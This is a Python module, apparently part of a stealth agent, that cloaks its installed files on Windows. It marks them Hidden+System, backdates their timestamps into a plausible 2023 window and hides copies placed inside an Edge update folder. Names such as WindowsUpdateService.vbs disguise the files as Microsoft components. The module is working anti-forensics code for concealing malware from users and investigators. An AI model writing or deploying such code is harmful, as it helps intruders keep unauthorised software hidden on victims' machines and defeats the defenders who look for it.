"""Cloaking: file attributes and timestamp masking for agent artifacts.

Two fixes over the first cut:

* timestamps are scattered inside a plausible window instead of every file
  sharing the exact same mtime, which was a one-glance fingerprint;
* the ``%LOCALAPPDATA%\\Microsoft\\EdgeUpdate`` copy is cloaked selectively, so
  Edge's own files are not marked Hidden+System underneath a live Edge install.
"""

from __future__ import annotations

import ctypes
import hashlib
import os
import random

IS_WINDOWS = os.name == "nt"

FILE_ATTRIBUTE_HIDDEN = 0x02
FILE_ATTRIBUTE_SYSTEM = 0x04

#: 2023-01-01 .. 2023-06-01, the plausible window a "Microsoft" component would sit in.
_WINDOW_START = 1672531200
_WINDOW_END = 1685577600

#: Files and folders the agent actually owns inside a shared directory.
OWNED = ("agent.py", "bootstrap.py", "syspy", "install", "runtime",
         "kit.zip", "deploy.json", "adopted.json", "WindowsUpdateService.cmd",
         "WindowsUpdateService.vbs", "machine-state.json", "tombstone")

_EDGE_MARKER = "edgeupdate"


def _mtime_for(path: str) -> int:
    """Stable per-path pseudo-random timestamp, so a re-run does not reshuffle."""
    digest = hashlib.sha256(os.path.basename(path).encode("utf-8")).digest()
    span = _WINDOW_END - _WINDOW_START
    return _WINDOW_START + int.from_bytes(digest[:4], "big") % span


def cloak_path(path: str) -> bool:
    """Set Hidden+System on Windows and backdate to a plausible timestamp."""
    if not os.path.exists(path):
        return False
    try:
        stamp = _mtime_for(path)
        os.utime(path, (stamp, stamp))
    except Exception:
        pass

    if IS_WINDOWS:
        try:
            attrs = ctypes.windll.kernel32.GetFileAttributesW(path)
            if attrs != -1:
                ctypes.windll.kernel32.SetFileAttributesW(
                    path, attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
                )
                return True
        except Exception:
            return False
    return True


def _is_edge_copy(directory: str) -> bool:
    return os.path.basename(os.path.abspath(directory)).lower() == _EDGE_MARKER


def cloak_tree(directory: str, selective: bool = False) -> int:
    """Recursively cloak. ``selective`` skips names we do not own."""
    count = 0
    if not os.path.exists(directory):
        return 0
    if selective:
        cloak_path(directory)
        count += 1
        for name in OWNED:
            target = os.path.join(directory, name)
            if os.path.isdir(target):
                count += cloak_tree(target)
            elif os.path.isfile(target):
                cloak_path(target)
                count += 1
        return count

    cloak_path(directory)
    count += 1
    for root, dirs, files in os.walk(directory):
        for name in dirs:
            cloak_path(os.path.join(root, name))
            count += 1
        for name in files:
            cloak_path(os.path.join(root, name))
            count += 1
    return count


def cloak_install_directories() -> int:
    """Cloak every install location, respecting shared directories."""
    from . import stealth
    total = 0
    for directory in stealth.install_directories():
        if not os.path.isdir(directory):
            continue
        total += cloak_tree(directory, selective=_is_edge_copy(directory))
    return total
